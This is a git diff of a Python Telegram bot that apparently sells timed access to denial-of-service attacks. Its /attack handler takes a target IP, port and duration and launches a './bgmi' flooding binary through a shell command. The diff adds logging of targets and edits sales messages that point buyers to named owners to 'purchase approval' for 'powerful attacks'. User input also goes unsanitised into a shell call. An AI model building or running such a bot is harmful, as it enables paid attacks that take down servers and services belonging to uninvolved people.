@@ -15,7 +15,10 @@ admin_id = ["6768273586"]
 # File to store allowed user IDs
 USER_FILE = "users.txt"
 
-# File to store allowed user access
+# File to store command logs
+LOG_FILE = "log.txt"
+
+# File to store allowed user_access
 USER_ACCESS_FILE = "users_access.txt"
 
 # Function to read user IDs from the file
@@ -41,24 +44,42 @@ def save_user_access(data):
         for user_id, access_info in data.items():
             file.write(f"{user_id}:{access_info['expiry_time']}\n")
 
-# Function to handle expired access
-def handle_expired_access(user_id):
-    current_time = time.time()
-    if user_id in user_access:
-        expiry_time = user_access[user_id]["expiry_time"]
-        if current_time > expiry_time:
-            # Access expired, remove from allowed users
-            if user_id in allowed_user_ids:
-                allowed_user_ids.remove(user_id)
-                with open(USER_FILE, "w") as file:
-                    for user_id in allowed_user_ids:
-                        file.write(f"{user_id}\n")
-            # Remove from user_access
-            del user_access[user_id]
-            # Save user access data
-            save_user_access(user_access)
-            return True
-    return False
+# Function to log command to the file
+def log_command(user_id, target, port, time):
+    user_info = bot.get_chat(user_id)
+    if user_info.username:
+        username = "@" + user_info.username
+    else:
+        username = f"UserID: {user_id}"
+    
+    with open(LOG_FILE, "a") as file:  # Open in "append" mode
+        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
+
+# Function to clear logs
+def clear_logs():
+    try:
+        with open(LOG_FILE, "r+") as file:
+            if file.read() == "":
+                response = "Logs are already cleared. No data found."
+            else:
+                file.truncate(0)
+                response = "Logs cleared successfully."
+    except FileNotFoundError:
+        response = "No logs found to clear."
+    return response
+
+# Function to record command logs
+def record_command_logs(user_id, command, target=None, port=None, time=None):
+    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
+    if target:
+        log_entry += f" | Target: {target}"
+    if port:
+        log_entry += f" | Port: {port}"
+    if time:
+        log_entry += f" | Time: {time}"
+    
+    with open(LOG_FILE, "a") as file:
+        file.write(log_entry + "\n")
 
 @bot.message_handler(commands=['add'])
 def add_user(message):
@@ -84,7 +105,7 @@ def add_user(message):
         else:
             response = "Please specify a user ID and the number of days to add."
     else:
-        response = "Only @MrinMoYxCB can run this command."
+        response = "Only admin can run this command."
 
     bot.reply_to(message, response)
 
@@ -131,7 +152,7 @@ def show_all_users(message):
         except FileNotFoundError:
             response = "No data found."
     else:
-        response = "Only @MrinMoYxCB can run this command."
+        response = "Only admin can run this command."
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['id'])
@@ -139,13 +160,12 @@ def show_user_info(message):
     user_id = message.chat.id
     username = message.from_user.username if message.from_user.username else "No username"
     role = "User"  # Assuming role is User, adjust if you have role information
-    EXPIRY = "{expiry_date}"  # Assuming not approved, adjust if you have approval status information
-
     response = (f"👤 User Info 👤\n\n"
                 f"🔖 Role: User\n"
                 f"🆔 User ID: {user_id}\n"
                 f"👤 Username: @{username}\n"
-    )
+                )
+
     bot.reply_to(message, response)
 
 # Function to handle the reply when users run the /attack command
@@ -161,41 +181,72 @@ attack_cooldown = {}
 
 COOLDOWN_TIME = 20  # Cooldown time in seconds (20 seconds)
 
-# Handler for /attack command
+# Function to handle the reply when free users run the /bgmi command
+def start_attack_reply(message, target, port, time):
+    user_info = message.from_user
+    username = user_info.username if user_info.username else user_info.first_name
+    
+    response = f"{username}, 🚀 Attack Sent Successfully! 🚀.\n\nTarget IP : {target}\nPort : {port}\nTime : {time} seconds"
+    bot.reply_to(message, response)
+
+# Dictionary to store the last time each user ran the /bgmi command
+bgmi_cooldown = {}
+
+COOLDOWN_TIME = 20  # Cooldown time in seconds (20 seconds)
+
+# Handler for /bgmi command
 @bot.message_handler(commands=['attack'])
-def handle_attack(message):
+def handle_bgmi(message):
     user_id = str(message.chat.id)
-    username = message.from_user.username if message.from_user.username else "No username"
     if user_id in allowed_user_ids:
         # Check if the user is in admin_id (admins have no cooldown)
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
-            if user_id in attack_cooldown and (datetime.datetime.now() - attack_cooldown[user_id]).seconds < COOLDOWN_TIME:
-                response = "{username} are on cooldown. Please wait 20 seconds before running the /attack command again."
+            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
+                response = "You are on cooldown dude. Please wait 20 seconds before running the /bgmi command again."
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
-            attack_cooldown[user_id] = datetime.datetime.now()
+            bgmi_cooldown[user_id] = datetime.datetime.now()
         
         command = message.text.split()
-        if len(command) == 4:  # Updated to accept target, port, and duration
+        if len(command) == 4:  # Updated to accept target, port, and time
             target = command[1]
             port = int(command[2])  # Convert port to integer
-            duration = int(command[3])  # Convert duration to integer
-            if duration > 2800:
+            time = int(command[3])  # Convert time to integer
+            if time > 280:
                 response = "Error: Time interval must be less than 280 seconds."
             else:
-                record_command_logs(user_id, '/attack', target, port, duration)
-                log_command(user_id, target, port, duration)
-                start_attack_reply(message, target, port, duration)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {duration}"
+                record_command_logs(user_id, '/bgmi', target, port, time)
+                log_command(user_id, target, port, time)
+                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
+                full_command = f"./bgmi {target} {port} {time} 280"
                 subprocess.run(full_command, shell=True)
-                response = f"🚀 Attack Finished Successfully! 🚀.\n\nTarget IP: {target}\n Port: {port}\nTime: {duration} seconds."
+                response = f"🚀 Attack Finished Successfully! 🚀. \n\nTarget IP : {target}\nPort : {port}\nTime : {time} seconds."
         else:
             response = "Usage: /attack <ip> <port> <time>" # Updated command syntax
     else: 
-        response = ("🚫 Unauthorized Access! 🚫\n\n Oops! It seems like you don't have permission to use the /attack command. To gain access and unleash the power of attacks,\n\n you can:👉 Contact an Admin or the Owner @OFFICIALRINO for approval.\n🌟 Become a proud supporter and purchase approval.\n💬 Chat with an Owner @OFFICIALRINO now and level up your capabilities!\n\n🚀 Ready to supercharge your experience? Take action and get ready for powerful attacks!")
+        response = ("🚫 Unauthorized Access! 🚫\n\n Oops! {username}  seems like you don't have permission to use the /attack command. To gain access and unleash the power of attacks,\n\n you can:👉 Contact an Admin or the Owner @OFFICIALRINO for approval.\n🌟 Become a proud supporter and purchase approval.\n💬 Chat with an Owner @OFFICIALRINO now and level up your capabilities!\n\n🚀 Ready to supercharge your experience? Take action and get ready for powerful attacks!")
 
+    bot.reply_to(message, response)
+
+# Add /mylogs command to display logs recorded for attack and website commands
+@bot.message_handler(commands=['mylogs'])
+def show_command_logs(message):
+    user_id = str(message.chat.id)
+    if user_id in allowed_user_ids:
+        try:
+            with open(LOG_FILE, "r") as file:
+                command_logs = file.readlines()
+                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
+                if user_logs:
+                    response = "Your command logs:\n" + "".join(user_logs)
+                else:
+                    response = "No command logs found for you."
+        except FileNotFoundError:
+            response = "No command logs found."
+    else:
+        response = ("🚫 Unauthorized Access! 🚫\n\n Oops! {username} seems like you don't have permission to use the /mylogs command. To gain access and unleash the power of attacks,\n\n you can:👉 Contact an Admin or the Owner @OFFICIALRINO for approval.\n🌟 Become a proud supporter and purchase approval.\n💬 Chat with an Owner @OFFICIALRINO now and level up your capabilities!\n\n🚀 Ready to supercharge your experience? Take action and get ready for powerful attacks!")
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['help'])
@@ -214,7 +265,7 @@ def welcome_start(message):
     user_name = message.from_user.first_name
     response = (
         f"🥀Welcome {user_name}!\n\n"
-        "For User ID :  /id \n\n"
+        " For User ID : /id \n\n"
         "👉 Join our official channel - @wonderboy_cd ✅\n\n"
         "👑 For access: @MrinMoYxCB\n\n"
         "👑 OWNER : @earuingamgogoi"
@@ -228,12 +279,12 @@ def show_access_expiry(message):
         if user_id in user_access:
             expiry_timestamp = user_access[user_id]["expiry_time"]
             expiry_date = datetime.datetime.fromtimestamp(expiry_timestamp).strftime('%Y-%m-%d %H:%M:%S')
-            response = f"Your access expires on: {expiry_date}"
+            response = f"Hello {username} Your access expires on: {expiry_date}"
         else:
-            response = "Your access expiry information is not available."
+            response = "Hello {username} Your access expiry information is not available."
     else:
-        response = "You are not authorized to use this command."
-    bot.reply_to(message, response)
+        response = ("🚫 Unauthorized Access! 🚫\n\n Oops! {username} seems like you don't have permission to use the /plan command. To gain access and unleash the power of attacks,\n\n you can:👉 Contact an Admin or the Owner @OFFICIALRINO for approval.\n🌟 Become a proud supporter and purchase approval.\n💬 Chat with an Owner @OFFICIALRINO now and level up your capabilities!\n\n🚀 Ready to supercharge your experience? Take action and get ready for powerful attacks!")    
+        bot.reply_to(message, response)
 
 @bot.message_handler(commands=['admincmd'])
 def admin_commands(message):
@@ -265,7 +316,7 @@ def broadcast_message(message):
     if user_id in admin_id:
         command = message.text.split(maxsplit=1)
         if len(command) > 1:
-            message_to_broadcast = "❌❌ ATTENTION EVERYONE ❌❌\n MESSAGE FROM BOSS @MrinMoYxCB:\n\n" + command[1]
+            message_to_broadcast = "❌❌ ATTENTION EVERYONE ❌❌\n MEESSAGE FROM @MrinMoYxCB:\n\n" + command[1]
             with open(USER_FILE, "r") as file:
                 user_ids = file.read().splitlines()
                 for user_id in user_ids:
